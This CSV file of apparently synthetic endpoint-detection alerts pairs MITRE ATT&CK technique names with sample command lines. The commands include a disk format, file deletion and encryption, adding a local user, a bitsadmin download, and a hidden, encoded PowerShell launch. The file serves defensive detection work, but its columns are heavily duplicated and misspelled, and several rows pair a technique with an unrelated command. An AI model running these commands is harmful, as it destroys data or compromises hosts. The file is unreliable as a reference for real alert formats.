AlertID,creationTimeUtc,AlertTimestamp,severity,category,status,AlertName,AlertDescription,recommendedActions,vendorInformation,properties,AlertCategory,AlertSeverity,Technique,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,ProcessCommandLine,DetectionMethod,RecommendedActions,source,tactic,device_name,action,file_name,file_size,src_path,dst_path,Severity,Name,Event,AlertType,MachineId,Category,AlertId,EventTime,ExtendedProperties,ComputerName,Status,AlertDetails,EndpointDetails,DetectionSource,DetectionID,EventHash,AffectedEntities,Tactic,KillChainPhase,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,hostname,ip_address,os,pid,command_line,access_type,operation,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessName,ParentProcessCommandLine,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,EntityType,EntityName,OS,References,KillChain,MachineDomainName,MachineName,AlertLink,Recommendation,Vendor,Product,Path,Hash,Protocol,SourceIp,SourcePort,DestinationIp,DestinationPort,DomainName,URL,Type,EndpointID,EndpointName,ParentProcessPath,ProcessPath,Source,Host,User,Target,Port,Action,Reason,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,TargetUser,OriginalPermissions,NewPermissions,Field,Operator,Value,Tags,InjectedProcessName,InjectionTechnique,ControlName,sha1_hash,file_path,process_name,process_path,HostIP,AdditionalInfo,RegistryKey,RegistryValue,CloudProvider,APIOperation,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,ProcessHash,Hostname,SourceIP,DestinationIP,AttackType,AttackDuration,AffectedServices,AffectedHostname,AlertSource,alert_severity,action_taken,detection_source,Affected_Hostname,Injected_Process_Name,Parent_Process_Name,Injection_Technique,Alert_Source,machine_id,user_id,process_id,process_command_line,alert_type,alert_name,remote_address,remote_port,local_address,local_port,protocol,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,IP,OSVersion,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,ParentCommandLine,EventID,ParentHash,ExecutionStatus,EntityValue,Condition,Description,Endpoint,RemediationSteps,EventId,ProcessId,CloudAccount,local_ip,public_ip,detection_method,file_hash,malware_family,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,AttackTactic,AttackTechnique,EntityId,EntityIp,Details,TimestampUtc,SHA256,WebServiceName,WebServicePath,type,vendor,path,domain,host,Affected_Device,Affected_User,Malicious_Executable,Username,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentName,ProcessParentID,ArtifactType,ArtifactPath,ArtifactName,AleertDescription,AlertTimestamps,native_function_calls,source_ip,destination_ip,process_hash,parent_process_name,parent_process_hash,Detection_Details,Process_Path,Process_Command_Line,AffectedFile_Path,AlertTime,UserInfo,PhishingInfo,AffectedImagePath,AffectedEndpoints,IndicatorsOfCompromise,Loader_Process_Name,Loader_Technique,ProcessParentPath,ProcessParentHash,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,MACAddress,AlertyDescription,EventLogName,EventLogMessage,OperatingSystem,FallbackProtocol,Alertescription,modified_time,original_hash,current_hash,RemoteServer,affected_host,alert_category,alert_recommendation,alert_details,RuleName,ProcessParentCommandLine,AttackVector,AlertTimestampUtc,WebServerUrl,WebServerMethod,technique,remote_ip,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName
01234567-89ab-cdef-0123-456789abcdef,2022-10-15T12:30:00.0000000Z,2023-03-10T15:30:00Z,high,AccountManipulation,newAlert,Account Manipulation,An attempt was made to add a user account to the local Administrators group on a device,"['Block or quarantine the affected device', 'Investigate the source and destination of the activity', 'Reset the passwords for any accounts that may have been compromised']","{'provider': 'Microsoft Defender for Endpoint', 'providerVersion': '1.0'}","{'affectedEntities': [{'affectedEntityType': 'Machine', 'machine': {'id': '12345678-9abc-def0-1234-56789abcdef0', 'hostName': 'WIN10-PC', 'osPlatform': 'Windows 10 Enterprise', 'osVersion': '1909', 'machineGroup': {'id': '87654321-ba98-fedc-7654-3210fedcba98', 'name': 'Marketing', 'displayName': 'Marketing'}}}], 'eventTime': '2022-10-15T12:30:00.0000000Z', 'eventName': 'Local group membership changes', 'eventSeverity': 'High', 'actionTaken': 'Blocked', 'operationName': 'Add Local Group Member', 'user': {'domainName': 'MYDOMAIN', 'userName': 'jdoe', 'sid': 'S-1-5-21-1234567890-1234567890-1234567890-1001', 'email': 'jdoe@example.com'}, 'target': {'targetType': 'User', 'targetUserName': 'jsmith', 'targetUserSid': 'S-1-5-21-1234567890-1234567890-1234567890-1002'}, 'initiator': {'initiatorType': 'User', 'initiatorUserName': 'admin', 'initiatorSid': 'S-1-5-21-1234567890-1234567890-1234567890-500'}, 'additionalData': [{'name': 'New Member Name', 'value': 'jsmith'}, {'name': 'Group Name', 'value': 'Administrators'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
55554673,,2023-03-10T10:30:00Z,,,,BITS Jobs,APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host.,,,,Endpoint Detection and Response,High,BITS Jobs,hostname,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job /download /priority normal http://example.com/file.txt C:\file.txt,explorer.exe,C:\Windows\explorer.exe,File system monitoring and behavioral analysis,"['Terminate the process and remove any associated artifacts.', 'Investigate the source and destination of the BITS job.', 'Check for other suspicious activity on the endpoint and the network.', 'Update endpoint security software and monitor for any further activity.']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
789012,,2023-03-08T15:30:00Z,high,endpoint,,Communication Through Removable Media,A file transfer was initiated form a removed media drive (USB),,,,,,Communication Through Removable Media,,,,,,,,,EDR,Exfiltration,USB Drive,file transfer,confidential.docx,3.5MB,D:\confidential.docx,C:\Users\user1\Documents\confidential.docx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-T1609,,,,,,Container Administration Command Execution Detected,"In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as docker exec to execute a command within a running container.",,,,,,,,,,,,,,,,,,,,,,,High,Container Administration Command,"{'StartTime': '2022-03-15T14:30:00Z', 'EndTime': '2022-03-15T14:31:00Z', 'Source': {'HostName': 'Endpoint-001', 'IPAddress': '192.168.1.100'}, 'Destination': {'HostName': 'Container-001', 'IPAddress': '192.168.1.200'}, 'EventType': 'CommandExecution', 'Command': 'docker exec -it <container_id> /bin/bash'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
44555555,,,,,,Custom Script,A custom script was detected running on a machine that was performing internal reconnaissance,,,,,,,,,,,,,,,,,,,,,,,3,,,EDR,12345678-9abc-def0-1234-56789abcdef0,Script-based,EDR1234567890123456,2022-02-28T10:30:00.000Z,"{'AffectedEntities': [{'MachineId': '12345678-9abc-def0-1234-56789abcdef0', 'MachineName': 'SERVER-123', 'DomainName': 'COMPANY.LOCAL', 'IPAddress': '10.0.0.1', 'OSPlatform': 'Windows', 'OSBuild': '10.0.19043.1415', 'OSVersion': '20H2', 'ProcessName': 'powershell.exe', 'ProcessCommandLine': 'powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\internal_reconnaissance.ps1', 'ProcessId': 1234, 'ParentProcessName': 'cmd.exe', 'ParentProcessCommandLine': 'cmd.exe /c C:\\scripts\\internal_reconnaissance.bat', 'ParentProcessId': 5678, 'DetectionSource': 'MachineLearning'}], 'ScriptName': 'internal_scan.ps1', 'ScriptHash': '1234567890123456789012345678901234567890', 'ScriptFolderPath': 'C:\\scripts\\'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
453333,,2022-03-07T16:57:35.0000000Z,,,,Data Destruction,Data destruction activity was detected on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,3,,,,12345,Threat,,,"{'AlertType': 'Behavior', 'BehaviorName': 'Data Destruction', 'AlertId': '12345', 'ThreatName': 'Data Destruction', 'Severity': 'High', 'TimestampUtc': '2022-03-07T16:57:35.0000000Z', 'Tactic': 'Impact', 'Technique': 'Data Destruction', 'AffectedEntities': {'File': [{'Path': 'C:\\Users\\example-user\\Documents\\example-file.txt', 'Hash': '1234567890ABCDEF1234567890ABCDEF12345678', 'CreatedTimeUtc': '2022-03-06T16:57:35.0000000Z', 'ModifiedTimeUtc': '2022-03-06T16:57:35.0000000Z'}]}, 'CommandLine': 'cmd /c del C:\\Users\\example-user\\Documents\\example-file.txt'}",example-hostname,New,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0944444,,2023-03-08T09:00:00Z,,,,Data Encoding,Adversaries may encode data to make the content of command and control traffic more difficult to detect.,,,,,,,,,,,,,,,,,,,,,,,High,,,,,Endpoint,,,,,,"{'ProcessName': 'notepad.exe', 'ProcessPath': 'C:\\Windows\\system32\\notepad.exe', 'CommandLine': 'notepad.exe C:\\Users\\User1\\Desktop\\encoded.txt', 'ParentProcessName': 'explorer.exe', 'ParentProcessPath': 'C:\\Windows\\explorer.exe', 'EncodingType': 'Base64', 'EncodedData': 'SGVsbG8gV29ybGQh'}","{'Hostname': 'Endpoint1', 'IPAddress': '192.168.1.10', 'MACAddress': '00-0C-29-56-A7-34', 'OS': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3345678,,2022-03-08T15:12:30.0000000Z,,,,Data Encrypted,Data encryption activity for impact was detected on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,3,,,Behavior,12345,Threat,,,"{'AlertType': 'Behavior', 'BehaviorName': 'Data Encrypted for Impact', 'AlertId': '12345', 'ThreatName': 'Data Encrypted for Impact', 'Severity': 'High', 'TimestampUtc': '2022-03-08T15:12:30.0000000Z', 'MITRE': {'Tactic': ['Impact'], 'Technique': [{'Id': 'T1486', 'Name': 'Data Encrypted for Impact'}]}, 'AffectedEntities': {'File': [{'Path': 'C:\\Users\\example-user\\Documents\\example-file.txt', 'Hash': '1234567890ABCDEF1234567890ABCDEF12345678', 'CreatedTimeUtc': '2022-03-08T14:34:10.0000000Z', 'ModifiedTimeUtc': '2022-03-08T14:34:10.0000000Z'}]}, 'CommandLine': 'cmd /c cipher /e /a /s:C:\\Users\\example-user\\Documents\\example-file.txt'}",example-hostname,New,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
33567890,,2022-03-07T12:30:00Z,,,,Data Transfer Size Limits,Data transfer size limits were exceeded on endpoint. This approach may be used to avoid triggering network data transfer threshold alerts.,,,,,,Data Transfer Size Limits,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,Endpoint,123456789,ABCDEF1234567890,"[{'EntityName': 'Endpoint001', 'EntityType': 'Endpoint', 'IPAddress': '192.168.1.100', 'OS': 'Windows 10', 'UserName': 'User001'}]",Exfiltration,Exfiltration,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234,,2023-03-10T10:00:00Z,,,,Deploy Container,This alert is triggered when an attempt to deploy an unauthorized container is detected on a host,,,,Container Security,,Deploy Container,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,example.com,/usr/bin/docker,docker,docker run malicious/image,f1ef997989e37c17eb2a12d56a9ac05d,098f6bcd4621d373cade4e832627b4f6,192.168.1.100,john.doe,5678,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234,,2023-03-10T12:00:00Z,High,Endpoint Detection and Response,,Direct Volume Access,Adversaries may directly access a volume to bypass file access controls and file system monitoring.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,,,,,,,,MyComputer,192.168.1.100,Windows 10,123,cmd.exe /c net user test test123 /add,Direct,Write,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
934445,,2022-03-20T15:45:00Z,,,,Potential disk wiping activity detected,dversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources.,,,,,,,,,,,,cmd /c format c:,,,,,,,,,,,High,,,Behavior,,Disk Wipe,,,,,,,,EDR,,,,,,,C:\Windows\System32\cmd.exe,cmd.exe,,,,,user123,,,,,,,,,,example-device,123456,Windows,10.0.19042,2022-03-20T15:40:00Z,explorer.exe,explorer.exe,2022-03-20T15:30:00Z,example-device2,789012,Windows,10.0.19042,user456,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
098888,,2022-03-06T14:35:00Z,,,,Drive-by Compromise Detected,This alert fires when a drive-by compromise attempt is detected on an endpoint.,,,,Malware,,,,,,,,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",,"['Isolate the affected host immediately', 'Scan the host with an antivirus or EDR tool', 'Investigate the network traffic and identify the source of the attack']",,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,chrome.exe,,ab1234567890,cdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890,192.168.1.101,,,,,,,,,,,,,,,,,,,,,,,,Host,COMPANY-PC01,Windows 10,"['https://attack.mitre.org/techniques/T1189/', 'https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/drive-by-compromise']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
9989898,,2022-03-08T14:32:47Z,,,,Denial of Service,Defender for Endpoint detected an endpoint denial of service (DoS) attack on the system.,,,,,High,,,,,,,cmd.exe /c ping -n 10000 127.0.0.1,,,,,,,,,,,,,,,,,,,,,,,,Behavior monitoring,,,,,,,,cmd.exe,,,,192.168.1.101,acme\jdoe,1224,,,,,,,,,,,,,,,,,,,,,,,,,,"['Delivery', 'Exploitation']",acme.local,WIN10-PC,https://securitycenter.windows.com/alert/1234567890,Isolate the affected machine from the network to prevent further damage and investigate the root cause of the attack.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
111235,,2023-03-08T12:00:00.000000Z,,,,Exfiltration Over Alternative Protocol,"This alert is triggered when an adversary attempts to exfiltrate data using a protocol or service that is not typically used for this purpose, such as DNS or ICMP, using a command-line interface.",,,,,,,,,,,,,Behavior Monitoring,,,,,,,,,,High,,,,,Data Exfiltration,,,,,,,,,,,,,,,,,nslookup example.com 8.8.8.8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
02049090,,2022-03-10T15:30:00Z,,,,Exploit Public-Facing Application,An attempt was made to exploit a public-facing application on the endpoint.,,,,,,Exploit Public-Facing Application,,,,,,,,,,,,,,,,,High,Chrome,,ThreatDetection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Microsoft,Defender for Endpoint,C:\Program Files (x86)\Google\Chrome\Application\chrome.exe,5C6FCC7895CA5A218D8E3A9FDF56DEA1,HTTPS,192.168.1.100,54678.0,198.51.100.1,443.0,example.com,https://example.com/login,EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
030406fy,,2022-06-01T09:17:23Z,,,,Exploitation for Client Execution,Exploitation for Client Execution was detected on COMPANY-PC-01. The process 'cmd.exe' was launched with the following command line arguments: '/c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand JAB3AD4.....'.,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand JAB3AD4.....,,2a725f4d3d3dc6f3251a852f7686e8c6d7b6c98f17a0b0a51d6409aa9c32b327,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,Review the process and the associated arguments to determine if this was a legitimate action or if further investigation is needed. Consider blocking or restricting the use of Powershell or other scripting languages where appropriate.,,,,,,,,,,,,,123456,COMPANY-PC-01,C:\Windows\explorer.exe,C:\Windows\system32\cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
